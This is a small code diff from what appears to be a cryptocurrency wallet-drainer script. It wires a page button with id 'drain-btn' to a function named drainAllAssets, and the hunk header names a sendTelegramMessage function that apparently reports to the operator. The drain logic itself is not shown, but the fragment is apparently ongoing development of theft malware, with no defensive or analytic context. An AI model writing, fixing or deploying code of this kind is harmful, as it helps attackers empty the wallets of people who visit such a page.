@@ -99,6 +99,6 @@ function sendTelegramMessage(text) {
 document.addEventListener('DOMContentLoaded', () => {
     const drainBtn = document.getElementById('drain-btn');
     if (drainBtn) {
-        drainBtn.addEventListener('click', didtrans);
+        drainBtn.addEventListener('click', drainAllAssets);
     }
 });
